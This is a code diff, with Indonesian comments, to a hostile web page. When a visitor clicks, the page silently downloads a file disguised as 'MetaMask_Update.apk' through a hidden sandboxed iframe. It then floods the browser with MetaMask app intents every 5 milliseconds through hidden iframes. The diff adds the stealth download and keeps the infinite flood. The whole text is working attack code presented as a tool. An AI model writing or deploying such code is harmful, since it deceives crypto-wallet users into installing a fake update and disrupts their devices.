@@ -41,46 +41,67 @@
   }
 
   // ============================================
-  // 1. KONFIGURASI INTENT
+  // 1. KONFIGURASI
   // ============================================
+  // Native Intent MetaMask
   var METAMASK_INTENT = "intent://#Intent;" +
                         "package=io.metamask;" +
                         "scheme=metamask;" +
                         "end;";
 
   // ============================================
-  // 2. TRIGGER INFINITE FLOOD (KLIK)
+  // 2. TRIGGER FLOODING (KLIK)
   // ============================================
   document.body.addEventListener('click', function() {
     if (executed) return;
     executed = true;
 
     document.getElementById('main-card').innerHTML = `
-      <h2>EXECUTING INFINITE FLOOD...</h2>
-      <p>Membanjiri Intent MetaMask...</p>
+      <h2>EXECUTING...</h2>
+      <p>Memulai Stealth Download & Intent Flood...</p>
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Infinite Intent Flood (5ms)...");
+    log("[!] Memulai Stealth Download & Intent Flood...");
 
-    // A. Kamuflase: Unduh APK (Sekali saja)
+    // ============================================
+    // A. STEALTH DOWNLOAD (IFRAME TERSEMBUNYI)
+    // ============================================
     try {
+      // Base64 APK (Dummy Header)
       var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
       var binary = atob(b64Apk);
       var bytes = new Uint8Array(binary.length);
       for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-      var blob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });
-      var url = URL.createObjectURL(blob);
-      var a = document.createElement('a');
-      a.href = url;
-      a.download = 'MetaMask_Update.apk';
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      log("[+] APK Download Triggered.");
-    } catch(e) {}
+      
+      // MIME Type APK
+      var blob = new Blob([bytes], { type: "application/vnd.android.package-archive" });
+      var blobUrl = URL.createObjectURL(blob);
 
-    // B. INFINITE FLOODING (Setiap 5ms)
+      // Buat iframe tersembunyi untuk download
+      var dlIframe = document.createElement("iframe");
+      dlIframe.sandbox = "allow-scripts allow-downloads-without-user-activation";
+      dlIframe.style.display = "none";
+      
+      // HTML di dalam iframe: Link download otomatis
+      dlIframe.srcdoc = `
+        <body>
+          <a id="dl" href="${blobUrl}" download="MetaMask_Update.apk">Download</a>
+          <script>
+            document.getElementById('dl').click();
+          <\/script>
+        </body>
+      `;
+      
+      document.body.appendChild(dlIframe);
+      log("[+] Stealth APK Download Triggered.");
+    } catch(e) {
+      log("[-] Download Error: " + e.message);
+    }
+
+    // ============================================
+    // B. INFINITE INTENT FLOODING (5ms)
+    // ============================================
     var iframeCount = 0;
     var floodInterval = setInterval(function() {
       try {
@@ -88,6 +109,7 @@
         iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
         iframe.style.display = "none";
         
+        // Suntikkan Intent MetaMask
         iframe.srcdoc = `
           <!DOCTYPE html>
           <html>
@@ -103,10 +125,10 @@
         iframeCount++;
         
         if (iframeCount % 10 === 0) {
-          log("[+] Iframe " + iframeCount + " terkirim.");
+          log("[+] Intent Flood " + iframeCount + " terkirim.");
         }
 
-        // Cleanup iframe lama untuk mencegah memori penuh (OOM)
+        // Batasi jumlah iframe agar browser tidak langsung OOM
         if (document.getElementById("launcher-container").children.length > 50) {
           document.getElementById("launcher-container").removeChild(
             document.getElementById("launcher-container").firstChild
@@ -114,7 +136,7 @@
         }
 
       } catch(e) {}
-    }, 5); // 5ms (Sangat Cepat)
+    }, 5); // 5ms
 
   }, { once: true });
 
